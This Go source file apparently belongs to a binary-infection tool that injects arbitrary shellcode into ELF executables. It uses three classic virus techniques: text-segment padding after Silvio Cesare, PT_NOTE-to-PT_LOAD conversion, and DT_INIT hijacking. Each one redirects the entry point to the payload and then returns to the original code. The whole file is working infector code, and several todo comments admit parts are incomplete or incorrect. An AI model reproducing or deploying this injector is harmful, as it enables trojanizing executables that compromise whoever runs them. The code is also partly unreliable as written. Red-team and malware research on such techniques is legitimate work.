package bj

import (
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"sort"

	"github.com/Binject/debug/elf"
	"github.com/Binject/shellcode/api"
)

// ElfBinject - Inject shellcode into an ELF binary
func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config *BinjectConfig) error {

	userShellCode, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		return err
	}

	fileinfo, err := os.Stat(sourceFile)
	filesize := fileinfo.Size()
	fmt.Println("Size of source file:", fileinfo.Size())
	fmt.Println("file size:", filesize)
	if err != nil {
		log.Fatal(err)
	}

	elfFile, err := elf.Open(sourceFile)
	if err != nil {
		return err
	}

	//
	// BEGIN CODE CAVE DETECTION SECTION
	//

	if config.CodeCaveMode == true {
		log.Printf("Using Code Cave Method")
		caves, err := FindCaves(sourceFile)
		if err != nil {
			return err
		}
		for _, cave := range caves {
			for _, section := range elfFile.Sections {
				if cave.Start >= section.Offset && cave.End <= (section.Size+section.Offset) &&
					cave.End-cave.Start >= uint64(MIN_CAVE_SIZE) {
					log.Printf("Cave found (start/end/size): %d / %d / %d \n", cave.Start, cave.End, cave.End-cave.Start)
				}
			}
		}
	}
	//
	// END CODE CAVE DETECTION SECTION
	//

	if elfFile.FileHeader.Type == elf.ET_EXEC {
		if config.InjectionMethod == SilvioInject {
			return staticSilvioMethod(elfFile, destFile, userShellCode)
		} else {
			return NoteToLoad(elfFile, destFile, userShellCode, filesize)
		}
	} else {
		return dynamicMethod(elfFile, destFile, userShellCode)
	}
}

func staticSilvioMethod(elfFile *elf.File, destFile string, userShellCode []byte) error {
	/*
			  Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
		        6. Increase p_shoff by PAGE_SIZE in the ELF header
		        7. Patch the insertion code (parasite) to jump to the entry point (original)
		        1. Locate the text segment program header
		            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
		            -Increase p_filesz to account for the new code (parasite)
		            -Increase p_memsz to account for the new code (parasite)
		        2. For each phdr which is after the insertion (text segment)
		            -increase p_offset by PAGE_SIZE
		        3. For the last shdr in the text segment
		            -increase sh_len by the parasite length
		        4. For each shdr which is after the insertion
		            -Increase sh_offset by PAGE_SIZE
		        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
					into the file - text segment p_offset + p_filesz (original)
	*/

	//PAGE_SIZE := uint64(4096)

	scAddr := uint64(0)
	sclen := uint64(0)
	shellcode := []byte{}

	// 6. Increase p_shoff by PAGE_SIZE in the ELF header
	//elfFile.FileHeader.SHTOffset += int64(PAGE_SIZE)

	afterTextSegment := false
	for _, p := range elfFile.Progs {

		if afterTextSegment {
			//2. For each phdr which is after the insertion (text segment)
			//-increase p_offset by PAGE_SIZE

			// todo: this doesn't match the diff
			//p.Off += sclen //PAGE_SIZE

		} else if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
			// 1. Locate the text segment program header
			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
			originalEntry := elfFile.FileHeader.Entry
			elfFile.FileHeader.Entry = p.Vaddr + p.Filesz

			// 7. Patch the insertion code (parasite) to jump to the entry point (original)
			scAddr = p.Vaddr + p.Filesz
			shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(originalEntry), elfFile.ByteOrder)

			sclen = uint64(len(shellcode))
			log.Println("Shellcode Length: ", sclen)

			// -Increase p_filesz to account for the new code (parasite)
			p.Filesz += sclen
			// -Increase p_memsz to account for the new code (parasite)
			p.Memsz += sclen

			afterTextSegment = true
		}
	}

	//	3. For the last shdr in the text segment
	sortedSections := elfFile.Sections[:]
	sort.Slice(sortedSections, func(a, b int) bool { return elfFile.Sections[a].Offset < elfFile.Sections[b].Offset })
	for _, s := range sortedSections {

		if s.Addr > scAddr {
			// 4. For each shdr which is after the insertion
			//	-Increase sh_offset by PAGE_SIZE
			//todo: this ain't right s.Offset += PAGE_SIZE

		} else if s.Size+s.Addr == scAddr { // assuming entry was set to (p_vaddr + p_filesz) above
			//	-increase sh_len by the parasite length
			s.Size += sclen
		}
	}

	// 5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
	//	into the file - text segment p_offset + p_filesz (original)
	elfFile.Insertion = shellcode

	return elfFile.WriteFile(destFile)
}

// PT_NOTE to PT_LOAD infection method
// ***********************************
// ***********************************

func NoteToLoad(elfFile *elf.File, destFile string, userShellCode []byte, fsize int64) error {

	injectSize := uint64(0)
	shellcode := []byte{}
	oldEntry := uint64(0)

	scAddr := uint64(0)

	// save old entry point
	oldEntry = elfFile.FileHeader.Entry

	for _, p := range elfFile.Progs {
		// Locate the data segment phdr
		if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
			// find the address where the data segment ends
			//dsEndAddr = p.Vaddr + p.Memsz
			// find the file offset of the end of the data segment
			//dsEndOff = p.Off + p.Filesz
			// get the alignment size used for the loadable segment
			//alignSize = p.Align
		} else if p.Type == elf.PT_NOTE {

			// save entry point p.Vaddr before we change it for adding jmp suffix
			// ???? scAddr = p.Vaddr
			// change PT_NOTE to PT_LOAD
			p.Type = elf.PT_LOAD                // Assign it this starting address
			p.Vaddr = 0xc000000 + uint64(fsize) // Assign it a size to reflect the size of injected code
			//
			elfFile.Entry = p.Vaddr
			//

			scAddr = p.Vaddr

			//
			p.Filesz += injectSize
			p.Memsz += injectSize
			p.Flags = elf.PF_R | elf.PF_X
			//p.Paddr = ... // irrelevant on most systems unless you want to change for debugging purposes?
			p.Off = uint64(fsize)
		}
	}

	// Update ehdr with new entry point to our modified segment
	//elfFile.Entry = 0xc000000 + uint64(fsize)

	// 7. Patch the insertion code (parasite) to jump to the entry point (original)
	//scAddr = PT_NOTE entry ?
	shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(oldEntry), elfFile.ByteOrder)

	log.Printf("OLD ENTRY: 0x%x\n", oldEntry)

	elfFile.InsertionEOF = shellcode

	return elfFile.WriteFile(destFile)
}

func dynamicMethod(elfFile *elf.File, destFile string, userShellCode []byte) error {
	// from positron/elfhack:
	// The injected code needs to be executed before any init code in the
	// binary. There are three possible cases:
	// - The binary has no init code at all. In this case, we will add a
	//   DT_INIT entry pointing to the injected code.
	// - The binary has a DT_INIT entry. In this case, we will interpose:
	//   we change DT_INIT to point to the injected code, and have the
	//   injected code call the original DT_INIT entry point.
	// - The binary has no DT_INIT entry, but has a DT_INIT_ARRAY. In this
	//   case, we interpose as well, by replacing the first entry in the
	//   array to point to the injected code, and have the injected code
	//   call the original first entry.
	// The binary may have .ctors instead of DT_INIT_ARRAY, for its init
	// functions, but this falls into the second case above, since .ctors
	// are actually run by DT_INIT code.

	log.Println("Entering Dynamic Method")

	// count DT_INITs, DT_INIT_ARRAYs, and find one NULL
	var initCnt, arrayCnt int
	originalEntryPoint := -1
	nullIdx := -1
	for idx, tv := range elfFile.DynTags {
		switch tv.Tag {
		case elf.DT_INIT:
			initCnt++
			originalEntryPoint = int(tv.Value)
		case elf.DT_INIT_ARRAY:
			arrayCnt++
			//todo: originalEntryPoint = tv.Value
		case elf.DT_NULL:
			if nullIdx < 0 {
				nullIdx = idx
			}
		}
	}

	// Insert the payload
	scAddr := uint64(0)
	sclen := uint64(0)
	shellcode := []byte{}
	for _, p := range elfFile.Progs {
		if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
			scAddr = p.Vaddr + p.Filesz
			if originalEntryPoint > 0 {
				shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(originalEntryPoint), elfFile.ByteOrder)
			} else {
				shellcode = userShellCode
			}
			sclen = uint64(len(shellcode))
			log.Println("Shellcode Length: ", sclen)
			p.Filesz += sclen
			p.Memsz += sclen
			break
		}
	}
	sortedSections := elfFile.Sections[:]
	sort.Slice(sortedSections, func(a, b int) bool { return elfFile.Sections[a].Offset < elfFile.Sections[b].Offset })
	for _, s := range sortedSections {
		if s.Size+s.Addr == scAddr {
			s.Size += sclen
		}
	}

	// - The binary has no init code at all. In this case, we will add a
	//   DT_INIT entry pointing to the injected code.
	if initCnt == 0 && arrayCnt == 0 {
		if nullIdx < 0 {
			return errors.New("No init in a DYN and no free slots means an invalid source binary")
		}
		elfFile.DynTags[nullIdx] = elf.DynTagValue{Tag: elf.DT_INIT, Value: scAddr}
	} else if initCnt > 0 {
		// - The binary has a DT_INIT entry. In this case, we will interpose:
		//   we change DT_INIT to point to the injected code, and have the
		//   injected code call the original DT_INIT entry point.
		for idx, tv := range elfFile.DynTags {
			switch tv.Tag {
			case elf.DT_INIT:
				elfFile.DynTags[idx] = elf.DynTagValue{Tag: elf.DT_INIT, Value: scAddr}
			}
		}
	}

	elfFile.Insertion = userShellCode

	return elfFile.WriteFile(destFile)
}
